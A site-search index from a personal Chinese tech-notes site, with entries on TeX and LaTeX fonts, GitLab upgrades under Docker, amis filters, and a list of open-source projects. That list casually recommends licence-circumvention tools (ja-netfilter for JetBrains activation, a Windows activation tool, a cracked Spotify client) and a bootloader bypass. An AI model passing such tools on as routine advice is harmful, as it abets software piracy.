var tipuesearch = {"pages":[{"title":"TeX 家族","text":"相关资源 参考: https://segmentfault.com/a/1190000038145401 https://www.latex-project.org/help/documentation/ TeX是一种宏语言，同时其也是一种排版引擎 教程 latex模版配置说明 引擎分类 引擎是真正干活的程序。引擎的基本功能就是解释TeX语法，把字排成行，把行排成页，涉及到断字、断行、分页等算法。最原始的引擎是TeX。 TeX 1978年由Donald Erwin Knuth（高德纳）开发。是后来大部分TeX相关的基础。其生成dvi文件，然后经由其他程序转换为pdf文件。 pdfTeX Tex语言的又一个实现，将TeX代码直接编译成PDF文件。 XeTeX TeX 语言的新的实现，支持 Unicode 编码和直接访问操作系统字体。 LuaTeX TeX 语言的一个完整的有扩展的实现。LuaTeX支持Unicode、系统字体和内嵌语言扩展，能直接输出PDF格式文件，也可以仍然输出 DVI 格式。 格式 TeX语言本身只有300个命令，晦涩难懂，只适合非正常的人类。一个简单的符号可能就需要多个命令来实现，\n可以将这些最基本的命令封装起来做个简写（宏）以实现特殊的目的。一堆简写的合集就构成了格式。格式可以与不同的引擎相结合。 Plain TeX 由Don Knuth提供的最小的宏集合。 LaTeX 更易于使用的宏集，最常见的一种格式。 ConTeXt 另一种常见的格式。 宏包 一些辅助文件，在LaTeX中叫做packages，在ConTeXt中叫做modules。\n在LaTeX格式中，导言区的usepackage的作用就是引入各种宏包。宏包其实也是一堆基本的TeX命令的集合，只是其不够全，所以称之为宏包而不是格式。 宏集 宏集 解释 plain TeX 最古老的TeX宏集，提供了一些最基本的命令 AMSTeX 是美国数学会提供的一个TeX宏集，它添加了许多数学符号和数学字体 LaTeX 相对于PlainTeX，它使得科技文档的排版更加直观和方便 ConTeXt 和 LaTeX 相比，它更加灵活和自由 发行版 一个完整的TeX需要最基本的TeX引擎、格式支持、各种辅助宏包、一些转换程序、GUI、编辑器、文档查看器等等。通过选择不同的组合就构成了不同的发行版。 TeX Live 国际TeX用户组织TUG开发, 支持Linux，Windows，Mac OS MiKTeX 只支持Windows CTeX CTeX基于MiKTeX，并加入了中文的支持，只支持Windows。同时CTEX是一个网站，ctex是可以很好支持中文的宏包。 ConTeXt Minimals 包含了最新版本的 ConTeXt teTeX 一个Unix下的TeX发行版，现在已经停止更新且并入TeXLive fpTeX 一个Windows的TeX发行版，已不再更新 其他相关 METAFONT：TeX中用来生成字体的程序。 MetaPost：用于生成图像。 BibTeX：用于生成参考文献。 dvipdf：dvi转换成pdf。","tags":"文档","url":"/yq-docs-document-tex-family-index.html","loc":"/yq-docs-document-tex-family-index.html"},{"title":"latex模版配置说明","text":"常见 配置说明: \\parindent 2em\n  控制段落首行缩进的长度\n\\setcounter{tocdepth}{3}\n  控制目录的深度\n\\setlength{\\parskip}{0.5\\baselineskip}\n  控制段落之间的垂直间距\n\\let\\cleardoublepage\\clearpage\n  这将告诉 LaTeX 在生成文档时,使用 \\clearpage 而不是 \\cleardoublepage。\n\n  \\cleardoublepage 会强制在新的一页开始, 这可能会导致出现不必要的空白页。\n  \\clearpage 则会更加灵活,只在需要的时候才开始新的一页。\n\n\\usepackage{xeCJK}\n  中文字体扩展管理宏包，务必添加！！\n  在编写的.tex文件的导言区导入宏包： \\usepackage{xeCJK}\n\n\\setmainfont{<font>}:\n  用于设置文档的主要字体,即用于正文的字体。\n  这个字体通常是一种衬线字体(serifed font)。\n  它会影响到文档中除了等宽字体和无衬线字体之外的所有地方。\n\n  设置本机已安装的字体很简单, 直接::\n\n    \\setCJKmainfont{已安装字体名}\n\n  但是设置未安装就有点麻烦了\n  比如设置外部未安装中文字体::\n\n    \\setCJKmainfont{NotoSerifCJKsc}[\n        Path=../../source/_static/fonts/SimplifiedChinese/,\n        Extension = .otf,\n        UprightFont=*-Regular,\n        BoldFont=*-Bold,\n        ItalicFont=*-Regular,\n        BoldItalicFont=*-Bold\n    ]\n\n  注意本地测试的时候 Path 最好设置为绝对路径, 因为 相对路径要设置为 build/latex 下的相对路径, 可能不一定能好找\n\n\\setCJKmainfont\n  设置中文主字体。\n\\setmonofont{<font>}:\n  用于设置等宽字体(monospace font)。\n  这种字体通常用于代码片段、终端输出等需要固定宽度的地方。\n  它不会影响到正文和标题等其他部分的字体。\n\\setCJKmonofont\n  用于设置中文等宽字体。\n\\setsansfont{<font>}:\n  用于设置无衬线字体(sans-serif font)。\n  这种字体通常用于标题、页眉页脚等需要简洁效果的地方。\n  它不会影响到正文和等宽字体等其他部分的字体。\n\\setCJKsansfont\n  用于设置中文无衬线字体。 注解 如果是用于 sphinx , 需要配置在 conf 的 latex_element 下的 preamble .\n详见 : Sphinx使用 拓展-设置中文字体 方案1-使用已安装字体 直接引用系统已存在字体名即可(如果是中文, 需要用对应的英文名) \\usepackage { xeCJK } \\usepackage { fontspec } \\setCJKmainfont { kai } 注解 类 Unix 系统可以使用 fc-list 查看已安装字体 方案2-使用已下载未安装字体 使用外部字体参考: Configuring fontspec to use the fonts \\usepackage { xeCJK } \\usepackage { fontspec } \\setCJKmainfont { NotoSerifCJKsc } [\n  Path=../../source/ _ static/fonts/SimplifiedChinese/,\n  Extension = .otf,\n  UprightFont=*-Regular,\n  BoldFont=*-Bold,\n  ItalicFont=*-Regular,\n  BoldItalicFont=*-Bold\n] 或者这样反过来也行, 顺序没影响 \\setCJKmainfont [\n  Path=../../source/ _ static/fonts/SimplifiedChinese/,\n  Extension = .otf,\n  Scale=0.9,\n  UprightFont=*-Regular,\n  BoldFont=*-Bold,\n  ItalicFont=*-Regular,\n  BoldItalicFont=*-Bold\n] { NotoSerifCJKsc } 另外除了 \\setmainfont{<font>} 设置主字体, 还有 \\setmonofont{<font>} 用于设置等宽字体(monospace font)。 \\setsansfont{<font>} 用于设置无衬线字体(sans-serif font)。\n酌情使用即可 若字体没有分斜体粗体等, 即 \\setCJKmainfont { canglang-xingkai } [\n    Path=../../source/ _ static/fonts/SimplifiedChinese/,\n    Extension = .ttf,\n    UprightFont=*,\n    BoldFont=*,\n    ItalicFont=*,\n    BoldItalicFont=*\n] 可以直接省略掉这部分配置 \\setCJKmainfont { canglang-xingkai } [\n    Path=../../source/ _ static/fonts/SimplifiedChinese/,\n    Extension = .ttf\n] 注解 Path的路径要找对, 不知道就用绝对路径. 另外, 字体名称就是文件名, 不需要去找字体文件真实的 family (截图使用的是 canglang-xingkai 字体) 拓展-中文断行 设置: \\XeTeXlinebreaklocale \"zh\"\n\\XeTeXlinebreakskip = 0pt plus 1pt\n\\definecolor{VerbatimColor}{rgb}{0.95,0.95,0.95}","tags":"文档","url":"/yq-docs-document-tex-family-latex-template-config.html","loc":"/yq-docs-document-tex-family-latex-template-config.html"},{"title":"fc-list","text":"查看所有已安装字体的信息 安装 brew install fontconfig 指令参数","tags":"操作系统","url":"/yq-docs-operating-system-Mac-MAC-instruction-fc-list.html","loc":"/yq-docs-operating-system-Mac-MAC-instruction-fc-list.html"},{"title":"otfinfo","text":"关键字 查看字体文件信息 查看字体名 查看指定字体文件的信息(Linux好像也有这指令) 选项参数 用法 otfinfo [ -sfzpg | OPTIONS ] [ OTFFILES... ] 查询选项 -s , --scripts Report font's supported scripts. -f , --features Report font's GSUB/GPOS features. -z , --optical-size Report font's optical size information. -p , --postscript-name Report font's PostScript name. -a , --family Report font's family name. -v , --font-version Report font's version information. -i , --info Report font's names and designer/vendor info. -g , --glyphs Report font's glyph names. -t , --tables Report font's OpenType tables. -u , --unicode Report font's supported Unicode code points. --variable Report variable font information. -T , --dump-table NAME Output font's 'NAME' table. 其他选项: --script=SCRIPT[.LANG]      Set script used for --features [latn]. -V , --verbose Print progress information to standard error. -h , --help Print this message and exit. -q , --quiet Do not generate any error messages. --version Print version number and exit. 常用指令 查看字体名 otfinfo -a source/_static/fonts/Inconsolata-VariableFont.ttf\nInconsolata 查看字体信息 ( Family 就是字体名) otfinfo -i source/_static/fonts/Inconsolata-VariableFont.ttf\nFamily: Inconsolata\nSubfamily: Regular\nFull name: Inconsolata Regular\nPostScript name: Inconsolata-Regular\nVersion: Version 3 .001\nUnique ID: 3 .001 ; CYRE ; Inconsolata-Regular\nDesigner: Raph Levien, Cyreal, Brenton Simpson\nDesigner URL: http://www.levien.com | http://www.cyreal.org | http://appsforartists.com\nManufacturer: Raph Levien, Cyreal, Google\nVendor URL: http://www.levien.com | http://www.cyreal.org | http://fonts.google.com\nCopyright: Copyright 2006 The Inconsolata Project Authors ( https://github.com/cyrealtype/Inconsolata ) License URL: http://scripts.sil.org/OFL\nLicense Description: This Font Software is licensed under the SIL Open Font License, Version 1 .1. This license is available with a FAQ at: http://scripts.sil.org/OFL\nVendor ID: CYRE\nPermissions: Installable 拓展-其他查看字体名的方式 使用 python 的 fonttools 库, from fontTools.ttLib import TTFont font_path = 'source/_static/fonts/Inconsolata-VariableFont.ttf' font = TTFont ( font_path ) font_name = font [ 'name' ] . getName ( 1 , 3 , 1 , 0x409 ) . string . decode ( 'utf-8' ) print ( f 'Font name: { font_name } ' )","tags":"操作系统","url":"/yq-docs-operating-system-Mac-MAC-instruction-otfinfo.html","loc":"/yq-docs-operating-system-Mac-MAC-instruction-otfinfo.html"},{"title":"docker配置gitlab","text":"相关资源: gitlab-ce官方docker地址: https://hub.docker.com/r/gitlab/gitlab-ce docker-mac安装: https://docs.docker.com/desktop/install/mac-install/#system-requirements 安装 我用的是16版本 docker pull gitlab/gitlab-ce:16.5.8-ce.0 配置 使用 docker-compose 来执行, 创建运行环境 mkdir ~/Project/Docker/gitlab cd ~/Project/Docker/gitlab\ntouch docker-compose.yml 内容 # docker-compose.yml services : gitlab : container_name : 'gitlabCe16' #容器名 image : 'gitlab/gitlab-ce:16.5.8-ce.0' restart : always # hostname: 'gitlab.example.com' environment : TZ : 'Asia/Shanghai' GITLAB_OMNIBUS_CONFIG : | external_url  'http://192.168.1.199'       # git拉代码的IP地址，公网IP和内网IP均可 gitlab_rails['gitlab_shell_ssh_port'] = 2222 # unicorn['port'] = 8888 # nginx['listen_port'] = 80 ports : #端口映射，可以自行配置 - '9080:80' - '8443:443' - '2222:22' volumes : #目录挂载，可以自定义 - /Users/yanque/Project/Docker/gitlab/config:/etc/gitlab - /Users/yanque/Project/Docker/gitlab/data:/var/opt/gitlab - /Users/yanque/Project/Docker/gitlab/logs:/var/log/gitlab - /etc/localtime:/etc/localtime:ro shm_size : '256m'","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-docker-turorial-docker-config-gitlab.html","loc":"/yq-docs-Container-and-cluster-docker-turorial-docker-config-gitlab.html"},{"title":"docker下gitlab版本升级流程","text":"相关资源: gitlab-ce官方docker地址: https://hub.docker.com/r/gitlab/gitlab-ce docker-mac安装: https://docs.docker.com/desktop/install/mac-install/#system-requirements 需要按照 官方指定升级路线 来升级 数据备份 每一次数据稳定了都记得备份一下数据, 防止升级发生意外 # 执行备份命令 docker exec -ti gitlab gitlab-rake gitlab:backup:create # 在持久化目录查看备份情况 root@git-nas:~# ll /opt/gitlab/data/backups/\n-rw------- 1 998 docker 342722560 6月 5 02 :18 1654366714_2022_06_04_14.4.0_gitlab_backup.tar\n-rw------- 1 998 docker 559196160 6月 11 22 :40 1654958434_2022_06_11_14.4.0_gitlab_backup.tar\nroot@git-nas:~# # 在目录 `/data/gitlab/backups/` 下会生成一个备份文件如: `1717471048_2024_06_04_gitlab_backup.tar` ，其中 `1717471048_2024_06_04` 即为此次备份都版本号。如果升级失败，可以还原备份 # gitlab-rake gitlab:backup:restore BACKUP=备份版本号 # 但是注意, 恢复的版本只能是备份的gitlab版本 docker exec -ti gitlab gitlab-rake gitlab:backup:restore BACKUP = 1717471048_2024_06_04 注解 此处参考: Docker部署的gitlab升级指南(升级到15.0.2版本) Docker环境从8.15.1升级到15.11.13 前提: 已经有一个正常的 8.15.1 版本的gitlab环境 (我是按照 gitlab-docker配置 生成的) 升级到8.15.8 备份 docker exec -ti gitlabCe8 gitlab-rake gitlab:backup:create 修改compose文件 docker-compose-8_15_8.yml services: gitlab: container_name: 'gitlabCe8_15_8' #容器名 image: 'gitlab/gitlab-ce:8.15.8-ce.0' restart: always # hostname: 'gitlab.example.com' environment: TZ: 'Asia/Shanghai' GITLAB_OMNIBUS_CONFIG: | external_url 'http://192.168.1.199' # git拉代码的IP地址，公网IP和内网IP均可 gitlab_rails [ 'gitlab_shell_ssh_port' ] = 2222 # unicorn['port'] = 8888 # nginx['listen_port'] = 80 ports: #端口映射，可以自行配置 - '9080:80' - '8443:443' - '2222:22' volumes: #目录挂载，可以自定义 - /Users/yanque/Project/Docker/gitlab/config:/etc/gitlab - /Users/yanque/Project/Docker/gitlab/data:/var/opt/gitlab - /Users/yanque/Project/Docker/gitlab/logs:/var/log/gitlab - /etc/localtime:/etc/localtime:ro pull&启动 docker-compose -f docker-compose-8_15_8.yml pull\ndocker-compose -f docker-compose-8_15_8.yml up -d 查看日志 docker logs -f gitlabCe8_15_8 看看最后的几百行, 等待结束后没有错误基本就成功了 看看网页功能是否正常 还可以命令诊断下状态 docker exec -it gitlabCe8_15_8 gitlab-rake gitlab:check SANITIZE = true 都是 yes 表示正常 也可以看下管理员检查页面: http://192.168.1.199:9080/admin/health_check 8.15.8升级到8.17.8 指令 # 备份当前 docker exec -ti gitlabCe8_15_8 gitlab-rake gitlab:backup:create # 备份完记得看看是否成功 # 停止容器 docker-compose -f docker-compose-8_15_8.yml down # 复制配置文件, 更新镜像名 cp docker-compose-8_15_8.yml docker-compose-8_17_8.yml # 更新部分 # container_name: 'gitlabCe8_17_8' # image: 'gitlab/gitlab-ce:8.17.8-ce.0' # pull & 启动容器 docker-compose -f docker-compose-8_17_8.yml up -d # 非docker需要手动触发更新 # docker exec -it gitlabCe8_17_8 gitlab-ctl pg-upgrade # 最后看看日志与功能是否正常 docker logs -f gitlabCe8_17_8 # 看看诊断是否正常 docker exec -it gitlabCe8_17_8 gitlab-rake gitlab:check SANITIZE = true # 看看网页访问有没有报错 升级到9.5.10 指令 # 备份当前 docker exec -ti gitlabCe8_17_8 gitlab-rake gitlab:backup:create # 备份完记得看看是否成功 # 停止容器 docker-compose -f docker-compose-8_17_8.yml down # 复制配置文件, 更新镜像名 cp docker-compose-8_17_8.yml docker-compose-9_5_10.yml # 更新部分 # container_name: 'gitlabCe9_5_10' # image: 'gitlab/gitlab-ce:9.5.10-ce.0' # pull & 启动容器 docker-compose -f docker-compose-9_5_10.yml up -d # 非docker需要等启动后手动触发更新 # docker exec -it gitlabCe9_5_10 gitlab-ctl pg-upgrade # 最后看看日志与功能是否正常 docker logs -f gitlabCe9_5_10 # 看看版本信息对不对: # gitlab-rake gitlab:env:info # 看看诊断是否正常 docker exec -it gitlabCe9_5_10 gitlab-rake gitlab:check SANITIZE = true # 看看网页访问有没有报错 提示, 高版本更新, 这之前的都是迁移(web服务不可用), 之后的就是更新完成的日志了 后续升级 跟上面的流程一样, 一直重复到最后一个版本即可. 附 15.11.13 版本的 docker-compose.yml services : gitlab : container_name : 'gitlabCe15_11_13' #容器名 image : 'gitlab/gitlab-ce:15.11.13-ce.0' restart : always # hostname: 'gitlab.example.com' environment : TZ : 'Asia/Shanghai' GITLAB_OMNIBUS_CONFIG : | external_url  'http://192.168.1.199'       # git拉代码的IP地址，公网IP和内网IP均可 gitlab_rails['gitlab_shell_ssh_port'] = 2222 # unicorn['port'] = 8888 # nginx['listen_port'] = 80 ports : #端口映射，可以自行配置 - '9080:80' - '8443:443' - '2222:22' volumes : #目录挂载，可以自定义 - /Users/yanque/Project/Docker/gitlab/config:/etc/gitlab - /Users/yanque/Project/Docker/gitlab/data:/var/opt/gitlab - /Users/yanque/Project/Docker/gitlab/logs:/var/log/gitlab - /etc/localtime:/etc/localtime:ro shm_size : '256m' 升级可能遇到的问题/错误 could not set permissions of file \"/var/opt/gitlab/postgresql/.s.PGSQL.50432\" 从 8.17.8 升级到 9.5.10 遇到了数据库升级失败错误 报错 \"/opt/gitlab/embedded/postgresql/9.2.18/bin/pg_ctl\" -w -l \"pg_upgrade_server.log\" -D \"/var/opt/gitlab/postgresql/data\" -o \"-p 50432 -b  -c listen_addresses='' -c unix_socket_permissions=0700 -c unix_socket_directory='/var/opt/gitlab/postgresql'\" start >> \"pg_upgrade_server.log\" 2>&1\nwaiting for server to start....LOG:  could not set permissions of file \"/var/opt/gitlab/postgresql/.s.PGSQL.50432\": Invalid argument 系统是Mac的, 猜测docker挂载的卷: xxx:/var/opt/gitlab 导致的权限问题, 但是想到Mac不是支持套接字的吗? 就找了一天的问题... 最后发现居然是docker共享设置的问题 参考: mac don't start docker gitlab caused by psotgresql , how to solve it 看到也有人在docker官方提了: Permissions issue with VirtioFS 将容器配置改成 gRPC FUSE 共享再重启容器后解决. NoMethodError (undefined method 'unique_ips_limit_enabled' for #<ApplicationSetting:0x00007fafe3a87718>) 还是从 8.17.8 升级到 9.5.10 遇到的问题, 这次是页面访问报错 500 或者 502 部分报错信息: NoMethodError (undefined method `unique_ips_limit_enabled' for #<ApplicationSetting:0x00007fafe3a87718>) 解决方法: 更新时数据库迁移存在问题, 需要手动迁移并重启 # 执行诊断(SANITIZE表示排除密码等敏感信息) 能看到是数据库问题 docker exec -it gitlabCe9_5_10 gitlab-rake gitlab:check SANITIZE = true # 手动进行数据迁移 docker exec -it gitlabCe9_5_10 gitlab-rake db:migrate # 重启 docker exec -it gitlabCe9_5_10 gitlab-ctl restart 参考: Undefined method 'unique_ips_limit_enabled' after update to 9.0 升级到13.x.x版本后的提示hash存储转换(hashed storage) 我是在诊断的时候看到的 docker exec -it gitlabCe13_0_14 gitlab-rake gitlab:check SANITIZE = true ...\nAll projects are in hashed storage? ... no Try fixing it: Please migrate all projects to hashed storage as legacy storage is deprecated in 13 .0 and support will be removed in 14 .0. For more information see: doc/administration/repository_storage_types.md\n... 解决: 触发hash存储转换 docker exec -it gitlabCe13_0_14 gitlab-rake gitlab:storage:migrate_to_hashed\nEnqueuing migration of 1 projects in batches of 200 . Done!\n\nWhat ' s next? Try Docker Debug for seamless, persistent debugging tools in any container or image → docker debug gitlabCe13_1_11 Learn more at https://docs.docker.com/go/debug-cli/ 注解 如果不转换hash存储, 无法成功升级到14版本 Expected batched background migration for the given configuration to be marked as 'finished', but it is 'active' 升级到 14.3.6 的时候一直在失败重启. 查看日志 logs/gitlab-rails/gitlab-rails-db-migrate-2024-06-05-16-32-25.log 发现错误信息: rake aborted!\nStandardError: An error has occurred, all later migrations canceled:\n\nExpected batched background migration for the given configuration to be marked as 'finished', but it is 'active':     {:job_class_name=>\"CopyColumnUsingBackgroundMigrationJob\", :table_name=>\"push_event_payloads\", :column_name=>\"event_id\", :job_arguments=>[[\"event_id\"], [\"event_id_convert_to_bigint\"]]}\n\nFinalize it manualy by running\n\n  sudo gitlab-rake gitlab:background_migrations:finalize[CopyColumnUsingBackgroundMigrationJob,push_event_payloads,event_id,'[[\"event_id\"]\\, [\"event_id_convert_to_bigint\"]]']\n\nFor more information, check the documentation\n\n  https://docs.gitlab.com/ee/user/admin_area/monitoring/background_migrations.html#database-migrations-failing-because-of-batched-background-migration-not-finished 根据信息提示, 手动执行 # 先进容器 gitlab-rake gitlab:background_migrations:finalize [ CopyColumnUsingBackgroundMigrationJob,push_event_payloads,event_id, '[[\"event_id\"]\\, [\"event_id_convert_to_bigint\"]]' ] 14.x.x版本后支持可视化迁移流程 这里是数据库迁移结束后, 服务基本启动后, 剩余部分额外迁移服务.\n尽量等待此处任务( http://192.168.1.199:9080/admin/background_migrations )全部完成 相关指令集合 备份创建/恢复(只能同版本) gitlab-rake gitlab:backup:create\ngitlab-rake gitlab:backup:restore BACKUP = 版本号比如1717471048_2024_06_04 手动数据迁移 docker exec -it gitlabCe9_5_10 gitlab-rake db:migrate 重启 gitlab-ctl restart # stop 停止 执行不带敏感信息的gitlab诊断 gitlab-rake gitlab:check SANITIZE = true 触发hash存储转换 gitlab-rake gitlab:storage:migrate_to_hashed","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-docker-turorial-docker-gitlab-upgrade-process.html","loc":"/yq-docs-Container-and-cluster-docker-turorial-docker-gitlab-upgrade-process.html"},{"title":"validateApi提交联动数据","text":"算是接着 自定义数据过滤器 的, 有此篇内容就是因为结合自定义过滤器的时候, validateApi 提交验证数据的时候, 只会提交第一次(修改前)的数据, 通过辅助组件过滤器修改后,\n不会触发新的提交. 解决方式, 在 validateApi 中提交数据的时候, 显示指定过滤器 (代码 validateApi/data 部分) { type : \"select\" , label : \"选择想要的数据\" , name : \"select-want\" , options : msgLevelOption , multiple : true , value : \"${help\\\\-for\\\\-want\\\\-select}\" , // 有斜杠转义 // 单项数据校验 validateApi : { \"method\" : \"post\" , \"url\" : \"/post/save/data\" , \"data\" : { \"select-want\" : \"${select\\\\-want | sortByVal:\" + msgLevel + \"}\" , // \"select-want\": \"${help\\\\-for\\\\-want\\\\-select}\", }, }, // 这个有个bug, 当 value 是通过其他组件联动修改的时候, 修改后的数据不会触发校验. \"validateOnChange\" : true , }, { label : \"辅助select\" , type : \"input-text\" , name : \"help-for-want-select\" , value : \"${select\\\\-want | sortByVal:\" + msgLevel + \"}\" , // visible: false, }, 其它相关部分见上一节 自定义数据过滤器 的 实例 小节 注解 当前Amis版本: 3.5.2 , 此问题已经提ISSUSE https://github.com/baidu/amis/issues/10360 , 不知后续会如何处理","tags":"前端","url":"/yq-docs-front-end-frame-amis-turorial-valid-api-submit-both-data.html","loc":"/yq-docs-front-end-frame-amis-turorial-valid-api-submit-both-data.html"},{"title":"自定义数据过滤器","text":"什么是过滤器? 参考: https://aisuda.bce.baidu.com/amis/zh-CN/docs/concepts/data-mapping#过滤器 介绍 不过新版作者那边觉得这玩意是历史包袱, 考虑到兼容性才保留 // node_modules/amis-formula/lib/filter.d.ts import { FilterMap } from './types' ; /** * filter 是历史包袱，不建议使用。因为这是之前的语法，所以在公式解析里面做了兼容。 * 建议用 ${ LEFT(xxx) } 这种函数调用语法。 */ export declare const filters : FilterMap ; export declare function registerFilter ( name : string , fn : ( input : any , ...args : any []) => any ) : void ; export declare function extendsFilters ( value : FilterMap ) : void ; export declare function getFilters () : FilterMap ; 所以没必要的话, 直接用新版 表达式 自定义旧版过滤器 import { registerFilter } from 'amis' ; // 注册一个过滤器 registerFilter ( 'myFilter' , ( input : any , ...args : any []) => { // ... }); 注解 对于存在传递(复杂)参数的情况, 只有使用过滤器才能将参数正常传递, 这也是我现在不用表达式的原因 实例 此过滤功能是, 将选择的数据, 按照给定数组的顺序排序. const msgLevel = [ 'debug' , 'info' , 'warning' , 'error' , 'circ' ] const msgLevelOption = msgLevel . map < optionProp > ( data => { return { label : data , value : data } }) // 按照给定 sortData 的顺序排序 registerFilter ( 'sortByVal' , ( data : string , sortData : string []) => { if ( ! data || data . indexOf ( ',' ) === - 1 ) return data const newData = data . split ( ',' ) console . log ( newData , '-=-=sort2...' ) newData . sort (( a , b ) => { const aIndex = sortData . indexOf ( a ) const bIndex = sortData . indexOf ( b ) return aIndex > bIndex ? 1 : - 1 ; }) return newData . join ( ',' ) }) json配置 { t ype : \"select\" , label : \"选择想要的数据\" , na me : \"select-want\" , op t io ns : msgLevelOp t io n , mul t iple : true , value : \"${help\\\\-for\\\\-want\\\\-select}\" , }, { label : \"辅助select\" , t ype : \"input-text\" , na me : \"help-for-want-select\" , value : \"${select\\\\-want | sortByVal:\" + msgLevel + \"}\" , }, 重要 如果定义了多个同名的过滤器, 好像没影响.","tags":"前端","url":"/yq-docs-front-end-frame-amis-turorial-custom-data-filter.html","loc":"/yq-docs-front-end-frame-amis-turorial-custom-data-filter.html"},{"title":"一些开源便利的Git项目","text":"frida-wechat-sticker 地址: https://github.com/K265/frida-wechat-sticker/tree/main 22年的时候可用于Windows下微信表情包提取, 现在不知道 amis 地址: https://github.com/baidu/amis 百度开源低代码框架, 前端 healthchecks cron 这种定时任务管理器, 是一个开源Django项目, 能在Crontab失效的时候通知 官网: https://healthchecks.io 在运维中, 当你的Crontab中的任务数超过10个的时候，\n你会发现这些任务管理起来非常困难。尤其是当这些Cron任务执行失败的时候 克隆: git clone https://github.com/healthchecks/healthchecks.git 它通过一个回调接口判断你的Crontab任务有没有顺利执行。 比如说你有一个python脚本定时执行，healthchecks给定的回调URL是: http://localhost:8000/ping/880cb4d 在配置Crontab脚本的时候，就需要这么写: 8 6 * * * python /home/user/test.py && curl -fsS -m 10 --retry 5 -o /dev/null http://localhost:8000/ping/880cb4d2 如果未按时调用回调接口，healthchecks将会通过邮件等通知方式告警。 hyper 一个基于electron的终端工具. 跨平台. 官网: https://hyper.is github: https://github.com/vercel/hyper furo 见 furo it-tools 地址: https://github.com/CorentinTh/it-tools 一个开源工具库, 比如加密解密, 颜色选择等, 成品中文官网: https://www.ittools.top ,\n个人实测用docker跑的中文翻译有问题, 源码直接跑的没问题. localsend 地址: https://github.com/localsend/localsend 一个类AirDrop的文件局域网传输软件, 官网: https://localsend.org MoneyPrinter 地址: https://github.com/FujiwaraChoki/MoneyPrinter 自动生成短视频(YouTube), 适合国外用. 注意这只是个客户端软件, 需要自己申请模型API, 之类 MoneyPrinterTurbo 地址: https://github.com/harry0703/MoneyPrinterTurbo 自动生成短视频, 适合国内用. 注意这只是个客户端软件, 需要自己申请模型API, 之类 成品地址: https://reccloud.cn marktext 地址: https://github.com/marktext/marktext 开源markdown编辑器. hashcat 地址: https://github.com/hashcat/hashcat 官网: https://hashcat.net/hashcat/ 一个密码爆破工具 ja-netfilter gitee地址: https://gitee.com/ja-netfilter/ja-netfilter , github上被删库了.\n作者主页: https://gitee.com/ja-netfilter 一个JB家产品激活工具. 支持激活码激活和激活服务器激活. 服务器激活可参考的教程: 【是可达鸭】一款JetBrains全家桶神器——ja-netfilter , 激活码激活可参考教程: https://zhuanlan.zhihu.com/p/546191706 , 虽然是另一款产品的教程, 不过差别较小. EMBY 地址: https://github.com/MediaBrowser/Emby 官网: https://emby.media 一个媒体服务器, 介绍可看: https://zhuanlan.zhihu.com/p/629282288 简单来说, 如果你有一块硬盘, 里面存了很多电视剧电影动漫,\n那你如何像腾讯视频一样快速查看播放呢?\n总不能每次找文件夹吧. EMBY可以开一个媒体服务器, 将资源放到这个媒体服务器,\n会自动检测你的影视内容, 并跟实际的媒体服务信息同步.\n这样就相当于搭建了一个本地的 腾讯视频 ? (仅类似). Apple系列可以使用暂时还是免费得 VidHub (软件免费, 但貌似没开源, 据说后面可能会收费). 注解 分客户端跟服务端. pot-desktop 地址: https://github.com/pot-app/pot-desktop 官网: https://pot-app.com 开源跨平台翻译软件. 跟之前买的 Bob 有点像, 不过Bob只有MacOS obs-studio 用于直播和屏幕录制的免费开源软件 地址: https://github.com/obsproject/obs-studio screenity 录屏并操作的浏览器插件 地址: https://github.com/alyssaxuu/screenity xManager 地址: https://github.com/Team-xManager/xManager 感觉就是安卓的 Spotify 应用商店, 可以下载其 pj 版 spicetify-cli 地址: https://github.com/spicetify/spicetify-cli 命令行工具，可以修改 Spotify 的样式 revanced-youtube 地址: https://github.com/NoName-exe/revanced-extended revanced-patches 地址: https://github.com/revanced/revanced-patches Patches for ReVanced 官网: https://revanced.app/ cli仓库: https://github.com/revanced/revanced-cli Xiaomi-HyperOS-BootLoader-Bypass 地址: https://github.com/MlgmXyysd/Xiaomi-HyperOS-BootLoader-Bypass 小米13系列即之前的机器, 越过小米社区账号限制解bl锁, 不知现在是否可用. koishi 地址: https://github.com/koishijs/koishi.git 聊天机器人 使用教程: https://koishi.chat/zh-CN/manual/starter/ docker安装教程: https://koishi.chat/zh-CN/manual/starter/docker.html 入门帖: https://forum.koishi.xyz/t/topic/556 阅读 legado 开源阅读-安卓 官网: https://gedoor.github.io 地址: https://github.com/gedoor/legado 书源地址可以使用: https://www.yckceo.com/yuedu/shuyuans/json/id/2.json 地址链接参考: https://www.bilibili.com/read/cv25432398/ 音乐 lx-music-mobile 开源音乐整合音乐播放器 手机版 官网: https://lxmusic.toside.cn 新版需要自己配置源. 因为腾讯律师函... 地址: https://github.com/lyswhut/lx-music-mobile lx-music-desktop 开源音乐整合音乐播放器 桌面版 地址: https://github.com/lyswhut/lx-music-desktop 一些问题链接: 歌曲无法试听与下载 六音源: https://www.sixyin.com/8498.html 六音源其他地址: www.sixyin.com , www.6yit.com , www.6yso.com MusicFree 免费开源音乐播放器 地址: https://github.com/maotoumao/MusicFree MusicFreeDesktop 地址: https://github.com/maotoumao/MusicFreeDesktop 漫画软件 Kotatsu 地址: https://github.com/KotatsuApp/Kotatsu 开源漫画软件, star: 2.9k , 截止目前(2024-05-07)有内置漫画源. 目前比较推荐的漫画软件 mihon 地址: https://github.com/mihonapp/mihon star: 6.9k , 无内置漫画源 Cimoc 地址: https://github.com/Haleydu/Cimoc star: 2.6k , 无内置漫画源 tachiyomi 地址: https://gitee.com/mirrors/tachiyomi/tree/master/ github上因为版权已经被删了, 找到个gitee的 工具-Android gkd 安卓跳广告客户端. 新版因为众所周知的原因移除默认规则. 需要自己弄订阅规则 地址: https://github.com/gkd-kit/gkd ' GKD_subscription gkd 对应规则, 第三方的, 从官方 fork . 地址: https://github.com/Adpro-Team/GKD_subscription/tree/main LiTiaotiao-Custom-Rules 地址: https://github.com/Snoopy1866/LiTiaotiao-Custom-Rules 断更的 李跳跳 自定义规则 MaterialFiles 安卓用开源文件管理器 地址: https://github.com/zhanghai/MaterialFiles 工具-Windows PowerToys 地址: https://github.com/microsoft/PowerToys Windows 下实用工具集, star 105k CMWTAT_Digital_Edition 开源的 Window 数字激活工具 地址: https://github.com/TGSAN/CMWTAT_Digital_Edition TranslucentTB Windows 透明任务栏 地址: https://github.com/TranslucentTB/TranslucentTB notepad-plus-plus notepad++ 地址: https://github.com/notepad-plus-plus/notepad-plus-plus NotepadNext 由于 notepad++ 开发者政治原因, 有了 NotepadNext 地址: https://github.com/dail8859/NotepadNext TrafficMonitor 